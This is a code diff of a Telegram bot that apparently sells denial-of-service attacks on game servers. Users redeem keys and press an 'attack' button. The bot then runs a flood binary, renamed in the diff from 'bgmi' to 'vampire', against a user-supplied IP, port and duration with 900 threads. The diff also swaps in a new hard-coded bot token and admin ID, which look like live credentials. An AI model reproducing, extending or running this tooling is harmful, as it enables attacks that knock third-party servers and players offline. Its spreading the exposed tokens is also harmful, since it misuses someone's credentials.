@@ -17,10 +17,10 @@ import subprocess
 
 
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('8008141404:AAEeQSZofyCymDr6WcCOicn7VkyETPiayiU')
+bot = telebot.TeleBot('7244073879:AAG3Zvh0777DLyGI94XjXLfHkmGKqaHuDWg')
 
 # Admin user IDs
-admin_id = {"7086729173"}
+admin_id = {"6182507613"}
 
 # Files for data storage
 USER_FILE = "users.json"
@@ -299,7 +299,7 @@ def start_command(message):
     myinfo_button = types.KeyboardButton("👤 My Info")
     redeem_button = types.KeyboardButton("🎟️ Redeem Key")
     markup.add(attack_button, myinfo_button, redeem_button)
-    bot.reply_to(message, "𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 Harsh AKM bot !", reply_markup=markup, parse_mode='Markdown')
+    bot.reply_to(message, "Welcome to @KAKASHI44443 bot !", reply_markup=markup, parse_mode='Markdown')
     bot.send_message(
         message.chat.id,
         f"*➖𝗣𝗹𝗲𝗮𝘀𝗲 𝗦𝗲𝗹𝗲𝗰𝘁 𝗮𝗻 𝗼𝗽𝘁𝗶𝗼𝗻 𝗳𝗿𝗼𝗺 𝗯𝗲𝗹𝗼𝘄 👀* ",
@@ -353,7 +353,7 @@ def process_attack_details(message):
                 # Record and log the attack
                 record_command_logs(user_id, 'attack', target, port, time)
                 log_command(user_id, target, port, time)
-                full_command = f"./bgmi {target} {port} {time} 900"
+                full_command = f"./vampire {target} {port} {time} 900"
                 username = message.chat.username or "No username"
                 # Send immediate response that the attack is being executed
                 response = f"‼️ 𝗛𝗲𝗹𝗹𝗼 @{username},  𝗬𝗼𝘂𝗿 𝗔𝘁𝘁𝗮𝗰𝗸 𝗼𝗻  {target} : {port} 𝘄𝗶𝗹𝗹 𝗯𝗲 𝗳𝗶𝗻𝗶𝘀𝗵𝗲𝗱 𝗶𝗻 {time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 . \n\n𝗣𝗲𝗮𝗰𝗲𝗳𝘂𝗹𝗹𝘆 𝘄𝗮𝗶𝘁 𝗶𝗻 𝗣𝗟𝗔𝗡𝗘  / 𝗟𝗢𝗕𝗕𝗬 𝘄𝗶𝘁𝗵𝗼𝘂𝘁 𝘁𝗼𝘂𝗰𝗵𝗶𝗻𝗴 𝗮𝗻𝘆 𝗕𝘂𝘁𝘁𝗼𝗻 ‼"
